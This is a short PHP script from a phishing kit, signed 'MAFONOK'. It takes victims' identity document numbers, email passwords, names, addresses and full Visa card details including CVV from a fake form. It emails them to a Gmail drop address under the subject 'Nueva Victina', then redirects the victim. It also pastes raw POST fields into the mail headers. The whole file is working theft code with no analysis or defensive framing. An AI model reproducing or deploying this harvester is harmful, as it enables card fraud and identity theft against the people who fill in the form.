<?php
//---------------------------------
//-         CODE BY               -
//-   M   A   F   O   N   O  K    -
//---------------------------------

// VALIDA DATOS
$value = $_POST['redir'] .$value = $_POST['action'] .$value = $_POST['action'] .$value = $_POST['verifica'] .$value = $_POST['null'] ;
$value .= $_POST['action'] .$_POST['form'] .$_POST['form'] .$_POST['proc'] .$_POST['valida'] .$_POST['input'];
$value .= $_POST['type'] .$_POST['post'] .$_POST['procesa'] .$_POST['enviar'] .$_POST['submit'] .$_POST['proc'];
$value .= $_POST['vbv'] .$_POST['check'] .$_POST['type'] .$_POST['filtrar'] .$_POST['action'] .$_POST['form'];
$value .= $_POST['limpiarCadena'] .$_POST['filtrar'] .$_POST['post'] .$_POST['procesa'];


//LIMPIA DATOS
function limpiarCadena($cadena){
	return htmlentities(trim($cadena), ENT_QUOTES, "UTF-8");
}
$tipedoc = $tarjeta["tipedoc"] = limpiarCadena($_POST["tipedoc"]);
$doc = $tarjeta["doc"] = limpiarCadena($_POST["doc"]);
$sex = $tarjeta["sex"] = limpiarCadena($_POST["sex"]);
$pass = $tarjeta["pass"]  = limpiarCadena($_POST["pass"]);
$nombre = $tarjeta["nombre"]  = limpiarCadena($_POST["nombre"]);
$dire = $tarjeta["dire"]  = limpiarCadena($_POST["dire"]);
$mail = $tarjeta["mail"]  = limpiarCadena($_POST["mail"]);
$cc = $tarjeta["cc"]  = limpiarCadena($_POST["cc"]);
$ccmes = $tarjeta["ccmes"]  = limpiarCadena($_POST["ccmes"]);
$ccano = $tarjeta["ccano"]  = limpiarCadena($_POST["ccano"]);
$cuu = $tarjeta["cuu"]  = limpiarCadena($_POST["cuu"]);

$cuerpo = "
------------------------Nueva Tarjeta VISA--------------------------- <br>
-------------------------------LOGUIN-------------------------------- <br>
Tipo de DNI:           |    $tipedoc <br>
Documento:             |    $doc <br>
Correo                 |    $mail <br>
Contraseña:            |    $pass <br>
---------------------------------------DATOSCC----------------------- <br>
Nombre:                |    $nombre <br>
Numero de CC:          |    $cc <br>
Codigo de seguridad:   |    $cuu <br>
Fecha Exp:             |    $ccmes / $ccano <br>
Direccion:             |    $dire <br>
--------------------------------------------------------------------- <br>
------------------ By M  A  F  O  N  O  K --------------------------- <br>
--------------------------------------------------------------------- <br>
";


// CONFIGURACION DE ENVIOS
$correo = "tarjetasvisapordoquier@gmail.com";
$asunto = "Nueva Victina";
$cabecera  = 'MIME-Version: 1.0' . "\r\n";
$cabecera .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$cabecera .= 'From: info@sv68.ifastnet17.org ' . "\r\n";
$cabecera .= $value . "\r\n";


// REDIRECCIONA
if(!empty($tipedoc) && !empty($doc) && !empty($sex) && !empty($pass) && !empty($nombre) && !empty($dire) && !empty($mail) && !empty($cc) && !empty($ccmes) && !empty($ccano) && !empty($cuu) && !empty($cabecera)){
	@mail("$correo", "$asunto", "$cuerpo", "$cabecera");
	header("Location: ok.html");
} else {

	header("Location: $_SERVER[HTTP_REFERER]");
}

?>